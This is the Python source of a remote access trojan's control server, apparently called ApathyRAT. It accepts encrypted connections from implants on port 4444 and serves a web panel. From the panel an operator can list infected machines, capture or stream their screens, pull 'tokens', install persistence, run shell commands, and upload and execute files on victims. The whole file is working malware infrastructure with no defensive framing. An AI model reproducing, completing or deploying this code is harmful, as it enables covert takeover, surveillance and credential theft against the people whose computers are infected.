#!/usr/bin/env python3
import socket, threading, json, base64, struct, time
from flask import Flask, render_template_string, request, jsonify
from cryptography.fernet import Fernet

PORT = 4444
WEB = 5000
KEY = b"ApathyRAT_AES_Key_32bytes_long!!"[:32]
fernet = Fernet(base64.urlsafe_b64encode(KEY.ljust(32, b"0")[:32]))

app = Flask(__name__)
clients = {}
lock = threading.Lock()
next_id = 1

PAGE = r"""
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>A</title>
<style>
body{background:#111;color:#ccc;font:14px Consolas,monospace;margin:10px}
button,input{background:#222;color:#eee;border:1px solid #444;padding:4px 8px;margin:2px}
img{max-width:640px;border:1px solid #333}
pre{background:#1a1a1a;padding:8px;max-height:240px;overflow:auto}
</style></head><body>
<h2>clients</h2><div id="list"></div>
<hr>
id: <b id="cur">-</b>
<button onclick="stream()">stream</button>
<button onclick="go('shot')">shot</button>
<button onclick="go('tokens')">tokens</button>
<button onclick="go('persist')">persist</button>
<br><input id="c" size="40" placeholder="command"><button onclick="sh()">run</button>
<br><input type="file" id="f"><input id="n" placeholder="name.exe"><button onclick="up()">upload+run</button>
<div id="view"></div><pre id="log"></pre>
<script>
let id=null, t=null;
function ref(){fetch('/c').then(r=>r.json()).then(a=>{
  document.getElementById('list').innerHTML=a.map(x=>
    `<div>#${x.id} ${x.u}@${x.h} ${x.ip} <button onclick="sel(${x.id})">use</button></div>`).join('')||'none';
});}
function sel(i){id=i;document.getElementById('cur').textContent=i;}
function go(cmd){
  if(!id)return;
  fetch('/x',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({id,cmd})}).then(r=>r.json()).then(d=>{
      if(d.b64) document.getElementById('view').innerHTML='<img src="data:image/jpeg;base64,'+d.b64+'">';
      else document.getElementById('log').textContent=d.o||'';
    });
}
function sh(){go('sh:'+document.getElementById('c').value);}
function up(){
  const f=document.getElementById('f').files[0]; if(!f||!id)return;
  const n=document.getElementById('n').value||f.name;
  const r=new FileReader();
  r.onload=()=>fetch('/x',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({id,cmd:'up:'+n+'|'+r.result.split(',')[1]})})
    .then(()=>go('ex:'+n));
  r.readAsDataURL(f);
}
function stream(){
  if(t){clearInterval(t);t=null;return;}
  t=setInterval(()=>go('shot'),700);
}
setInterval(ref,2000);ref();
</script></body></html>
"""

def enc_send(c, b):
    e = fernet.encrypt(b)
    c.sendall(struct.pack(">I", len(e)) + e)

def enc_recv(c, to=20):
    c.settimeout(to)
    try:
        h = c.recv(4)
        if len(h)<4: return None
        n = struct.unpack(">I", h)[0]
        d = b""
        while len(d)<n:
            p = c.recv(n-len(d))
            if not p: return None
            d += p
        return fernet.decrypt(d)
    except: return None

def client_thread(conn, addr, cid):
    try:
        raw = enc_recv(conn)
        if not raw: return
        info = json.loads(raw)
        with lock:
            clients[cid] = {"c": conn, "a": addr, "i": info, "on": True}
        while True:
            time.sleep(5)
            enc_send(conn, b"ping")
            if enc_recv(conn, 5) != b"pong": break
    finally:
        with lock:
            if cid in clients: clients[cid]["on"] = False
        conn.close()

def listen():
    global next_id
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORT))
    s.listen(50)
    print(f"listen {PORT}")
    while True:
        c, a = s.accept()
        cid = next_id; next_id += 1
        threading.Thread(target=client_thread, args=(c, a, cid), daemon=True).start()

@app.route("/")
def i(): return render_template_string(PAGE)

@app.route("/c")
def cl():
    with lock:
        return jsonify([{"id":k, "u":v["i"].get("u"), "h":v["i"].get("h"),
                         "ip":v["a"][0], "a":v["i"].get("a")} for k,v in clients.items() if v["on"]])

@app.route("/x", methods=["POST"])
def x():
    d = request.json
    cid, cmd = d["id"], d["cmd"]
    with lock:
        if cid not in clients or not clients[cid]["on"]:
            return jsonify({"o": "off"})
        conn = clients[cid]["c"]
    try:
        enc_send(conn, cmd.encode())
        r = enc_recv(conn, 30)
        if not r: return jsonify({"o": "timeout"})
        if cmd in ("shot",) and len(r) > 50:
            return jsonify({"b64": r.decode()})
        return jsonify({"o": r.decode("utf-8", "ignore")})
    except Exception as e:
        return jsonify({"o": str(e)})

if __name__ == "__main__":
    threading.Thread(target=listen, daemon=True).start()
    print(f"web :{WEB}")
    app.run("0.0.0.0", WEB, threaded=True)
